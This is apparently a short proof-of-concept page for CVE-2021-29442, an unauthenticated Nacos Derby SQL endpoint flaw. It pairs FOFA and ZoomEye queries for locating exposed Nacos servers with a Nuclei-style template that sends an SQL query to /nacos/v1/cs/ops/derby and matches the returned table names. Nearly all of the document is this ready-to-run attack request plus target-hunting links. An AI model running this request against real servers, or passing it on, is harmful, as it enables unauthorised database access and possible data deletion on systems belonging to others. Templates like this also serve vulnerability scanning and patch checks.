# QVD-2024-26473
QVD-2024-26473 &amp;&amp; CVE-2021-29442


# FOFA Search:
https://fofa.info/result?qbase64=YXBwPSJOYWNvcyI%3D
# ZoomEye Search:
https://www.zoomeye.org/searchResult?q=app%3A%22Alibaba%20Nacos%22


# POC:
id: CVE-2021-29442
info:
  name: Nacos Access control error vulnerability(CVE-2021-29442)
  author: Hu$SHA
  description: Allowing access the /derby without authentication and perform operations, such as querying or deleting databases
  reference:
    - https://github.com/VictorShem/QVD-2024-26473
    - https://www.cnnvd.org.cn/home/globalSearch?keyword=CNNVD-202104-2000
    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-67618
    - https://ti.qianxin.com/vulnerability/detail/94994
  severity: critical
  tags: cve, sql injection, nacos, rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st"

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "application/json"

      - type: regex
        part: body
        regex:
          - "\"TABLENAME\":\"(?:(?:(?:(?:(?:APP_CONFIGDATA_RELATION_[PS]UB|SYS(?:(?:CONGLOMERAT|ALIAS|(?:FI|RO)L)E|(?:(?:ROUTINE)?|COL)PERM|(?:FOREIGN)?KEY|CONSTRAINT|T(?:ABLEPERM|RIGGER)|S(?:TAT(?:EMENT|ISTIC)|EQUENCE|CHEMA)|DEPEND|CHECK|VIEW|USER)|USER|ROLE)S|CONFIG_(?:TAGS_RELATION|INFO_(?:AGGR|BETA|TAG))|TENANT_CAPACITY|GROUP_CAPACITY|PERMISSIONS|SYSCOLUMNS|SYS(?:DUMMY1|TABLES)|APP_LIST)|CONFIG_INFO)|TENANT_INFO)|HIS_CONFIG_INFO)\""

      - type: status
        status:
          - 200
